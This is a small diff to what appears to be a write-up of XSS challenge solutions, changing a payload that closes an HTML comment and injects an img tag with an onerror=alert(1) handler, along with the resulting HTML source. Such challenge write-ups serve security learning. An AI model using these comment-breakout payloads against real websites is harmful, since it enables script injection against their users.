@@ -102,13 +102,13 @@ function escape(s) {
 - Solution
 
 ```
-Comment#--><img src onerror=alert(1) /><!--
+Comment#--><img src onerror=alert(1)
 ```
 
 - HTML source
 
 ```
-<!----><img src onerror=alert(1) /><!---->
+<!----><img src onerror=alert(1)-->
 ```
 
 ## Skandia
